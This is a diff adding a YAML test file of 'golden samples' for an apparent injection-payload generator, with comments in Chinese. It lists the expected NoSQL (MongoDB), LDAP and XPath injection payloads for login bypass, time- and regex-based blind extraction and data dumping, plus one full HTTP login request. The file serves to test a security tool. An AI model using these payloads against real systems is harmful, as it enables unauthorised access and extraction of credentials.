@@ -1,0 +1,243 @@
+# NoSQL / LDAP / XPath 黄金样本（§13.2）
+#
+# NoSQL 这批逼出了新的提交方式 `json-body`——载荷是**整段 JSON 体**而不是字段值。
+# LDAP 和 XPath 是独立的两门过滤器/表达式语言，各有自己的内容类型标签。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= NoSQL =================
+
+  - name: MongoDB 登录绕过 $ne
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.ne
+      outputs: [raw]
+    expect:
+      payload: '{"username":{"$ne":null},"password":{"$ne":null}}'
+      syntax: ok
+
+  - name: MongoDB 登录绕过 $gt
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.gt
+      outputs: [raw]
+    expect:
+      payload: '{"username":{"$gt":""},"password":{"$gt":""}}'
+      syntax: ok
+
+  - name: MongoDB 登录绕过 $regex
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.regex
+      outputs: [raw]
+    expect:
+      payload: '{"username":{"$regex":"^.*"},"password":{"$regex":"^.*"}}'
+      syntax: ok
+
+  - name: MongoDB 指定账号免密
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.in
+      vars: {user: admin}
+      outputs: [raw]
+    expect:
+      payload: '{"username":{"$in":["admin"]},"password":{"$ne":null}}'
+      syntax: ok
+
+  - name: MongoDB $where 恒真
+    state:
+      vuln: nosql
+      template: nosql.mongodb.where.true
+      outputs: [raw]
+    expect:
+      payload: '{"$where":"return true"}'
+      syntax: ok
+
+  - name: MongoDB $where 时间盲注（字面量 < 紧邻占位符）
+    state:
+      vuln: nosql
+      template: nosql.mongodb.where.sleep
+      outputs: [raw]
+    expect:
+      # body 里写的是 `-d<<<ms>>`：前两个 < 是字面量小于号，后两个是占位符边界。
+      # 少写一个 < 会把小于号吃掉，产出 -d5000
+      payload: '{"$where":"function(){var d=new Date();while(new Date()-d<5000){};return true;}"}'
+      syntax: ok
+
+  - name: MongoDB 正则盲注
+    state:
+      vuln: nosql
+      template: nosql.mongodb.blind.regex
+      vars: {prefix: a}
+      outputs: [raw]
+    expect:
+      payload: '{"username":{"$regex":"^a"}}'
+      syntax: ok
+
+  - name: MongoDB 字符串上下文恒真
+    state:
+      vuln: nosql
+      template: nosql.mongodb.string.or
+      outputs: [raw]
+    expect:
+      payload: "' || '1'=='1"
+
+  - name: MongoDB 字符串上下文截断
+    state:
+      vuln: nosql
+      template: nosql.mongodb.string.terminate
+      outputs: [raw]
+    expect:
+      payload: "'; return true; //"
+
+  - name: NoSQL 载荷作为整个 JSON 体提交（不加引号）
+    state:
+      vuln: nosql
+      template: nosql.mongodb.auth.bypass.ne
+      submit: json-body
+      method: POST
+      host: example.com
+      path: /login
+      outputs: [request]
+    expect:
+      outputs:
+        # 关键在于 body 里没有引号包裹——用 json 提交方式会变成 "{\"$ne\": null}"，完全不是一个东西
+        request: "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\nContent-Length: 49\r\n\r\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
+
+  # ================= LDAP =================
+
+  - name: LDAP 通配符登录绕过
+    state:
+      vuln: ldap
+      template: ldap.generic.auth.wildcard
+      outputs: [raw]
+    expect:
+      payload: "*)(uid=*))(|(uid=*"
+
+  - name: LDAP 密码条件恒真
+    state:
+      vuln: ldap
+      template: ldap.generic.auth.always_true
+      # user 是自由变量（用户名因目标而异），没有默认值，样本必须自己填
+      vars: {user: admin}
+      outputs: [raw]
+    expect:
+      # <<user>> 填 admin，<<pf>> 取默认 password
+      payload: "admin)(|(password=*"
+
+  - name: LDAP 密码条件恒真 · 改属性名与用户名
+    state:
+      vuln: ldap
+      template: ldap.generic.auth.always_true
+      slots: {pf: userPassword}
+      vars: {user: cn=admin}
+      outputs: [raw]
+    expect:
+      payload: "cn=admin)(|(userPassword=*"
+
+  - name: LDAP 或运算过滤器
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.or
+      outputs: [raw]
+    expect:
+      payload: "(|(uid=*)(uid=*))"
+
+  - name: LDAP 或运算过滤器 · 换属性
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.or
+      slots: {attr: sAMAccountName}
+      outputs: [raw]
+    expect:
+      payload: "(|(sAMAccountName=*)(sAMAccountName=*))"
+
+  - name: LDAP 盲注逐字符提取
+    state:
+      vuln: ldap
+      template: ldap.generic.blind.prefix
+      vars: {prefix: adm}
+      outputs: [raw]
+    expect:
+      payload: "*)(uid=adm*"
+
+  - name: LDAP 盲注探长度
+    state:
+      vuln: ldap
+      template: ldap.generic.blind.length
+      vars: {stars: "***"}
+      outputs: [raw]
+    expect:
+      # 尾部那个 * 是 body 里写死的，加上变量里的三个
+      payload: "*)(userPassword=****"
+
+  - name: LDAP 取反过滤器
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.not
+      vars: {value: admin}
+      outputs: [raw]
+    expect:
+      payload: ")(!(uid=admin))(|(uid=*"
+
+  - name: LDAP 空字节截断
+    state:
+      vuln: ldap
+      template: ldap.generic.auth.nullbyte
+      outputs: [raw]
+    expect:
+      payload: "*))%00"
+
+  # ================= XPath =================
+
+  - name: XPath 登录绕过
+    state:
+      vuln: xpath
+      template: xpath.generic.auth.or
+      outputs: [raw]
+    expect:
+      payload: "' or '1'='1' or '1'='2"
+
+  - name: XPath 数字型恒真
+    state:
+      vuln: xpath
+      template: xpath.generic.auth.or.numeric
+      outputs: [raw]
+    expect:
+      payload: " or 1=1 or 1=2"
+
+  - name: XPath 盲注探节点数
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.count
+      vars: {n: "3"}
+      outputs: [raw]
+    expect:
+      payload: "' or count(//user)=3 or '1'='2"
+
+  - name: XPath 盲注逐字符提取
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.substring
+      vars: {pos: "1", ch: a}
+      outputs: [raw]
+    expect:
+      payload: "' or substring(//user[1]/password,1,1)='a' or '1'='2"
+
+  - name: XPath 盲注猜节点名
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.name
+      vars: {name: user}
+      outputs: [raw]
+    expect:
+      payload: "' or name(//*[1])='user' or '1'='2"
+
+  - name: XPath 用 | 取并集
+    state:
+      vuln: xpath
+      template: xpath.generic.dump.union
+      outputs: [raw]
+    expect:
+      payload: "'] | //user/* | //*['"
